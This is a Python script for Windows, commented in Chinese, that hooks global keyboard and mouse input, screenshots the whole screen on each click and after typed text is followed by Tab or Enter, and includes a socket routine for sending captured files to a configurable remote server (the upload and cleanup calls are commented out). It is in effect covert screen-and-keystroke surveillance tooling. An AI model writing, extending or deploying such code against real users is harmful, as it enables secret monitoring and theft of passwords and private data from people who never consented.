# -*- coding:utf-8 -*-
# 2018-07-01
# 客户端程序，只用到此脚本文件

# 导入相应类库
import time
import sys
import math
import os
import socket
from PIL import ImageGrab
import pyHook
import pythoncom
import win32con, win32api


# 全局变量
host = "127.0.0.1"      # 远程服务端IP
port = 9999             # 远程服务端端口
pos = (0, 0)            # 客户端鼠标位置
msg = ""                # 键盘键入消息


# 进度条
def progress_bar(cur, total):
    percent = "{:.2%}".format(float(cur)/float(total))
    sys.stdout.write("\r")
    sys.stdout.write("[%-50s] %s" % ('=' * int(math.floor(cur*50/total)), percent))
    sys.stdout.flush()


# 获取文件大小
def get_file_size(m_file):
    m_file.seek(0, os.SEEK_END)
    file_length = m_file.tell()
    m_file.seek(0, 0)
    return file_length


# 获取文件名称
def get_file_name(file_path):
    ind = file_path.rindex('/')  # 文件路径以反斜杠'/'组成
    if ind == -1:
        return file_path
    else:
        return file_path[ind+1:]


# 传输文件
def send_file(host_, port_, file_path):
    if os.path.exists(file_path):
        time_start = time.clock()
        local_file = open(file_path, "rb")

        file_size = get_file_size(local_file)
        file_name = get_file_name(file_path)

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((host_, port_))

        # 发送文件大小
        client.send((str(file_size)))
        response = client.recv(1024)
        print ("res1", response)

        # 发送文件名称
        client.send(file_name)
        response = client.recv(1024)
        print ("res2", response)

        # 发送文件内容
        sent_length = 0
        while sent_length < file_size:
            buffer_len = 1024
            buf = local_file.read(buffer_len)
            client.send(buf)

            sent_length += len(buf)
            process = int(float(sent_length)/float(file_size)*100)
            progress_bar(process, 100)
        client.recv(1024)
        local_file.close()
        time_end = time.clock()
        print("\n发送完成，完成时间：%.3f秒" % (time_end - time_start))
    else:
        print("文件不存在！")


# 截图程序，截全屏
def screen_shot(action):
    # 模拟window系统快捷键PrtSc截图
    win32api.keybd_event(win32con.VK_SNAPSHOT, 0, 0, 0)
    win32api.keybd_event(win32con.VK_SNAPSHOT, 0, win32con.KEYEVENTF_KEYUP, 0)
    time.sleep(0.12)

    cur_time = time.strftime("%Y_%m_%d_%H_%M_%S", time.localtime(time.time()))
    # pic = ImageGrab.grab()
    pic = ImageGrab.grabclipboard()
    pic_path = 'F:/untitled2/img/pic_%s(%d,%d)[%s].jpg' % (cur_time, pos[0], pos[1], action)
    print (pic_path)
    pic.save(pic_path)
    # send_file(host, port, pic_path)
    # os.remove(pic_path)


# 鼠标响应事件
def mouse_event(event):
    global pos
    global msg

    pos = event.Position
    if len(msg) != 0:
        msg = ""
        screen_shot("mouse1")
    else:
        screen_shot("mouse0")

    return True


# 键盘响应事件
def keyboard_event(event):
    global msg

    if 31 < event.Ascii < 128:
        msg += chr(event.Ascii)
    if (len(msg) != 0) and (event.Ascii == 9 or event.Ascii == 13):
        msg = ''
        screen_shot("keyboard")

    return True


# 主函数，客户端程序入口
def main():
    hm = pyHook.HookManager()
    hm.SubscribeMouseLeftDown(mouse_event)
    hm.HookMouse()
    hm.KeyDown = keyboard_event
    hm.HookKeyboard()
    pythoncom.PumpMessages()


# 运行
if __name__ == '__main__':
    main()
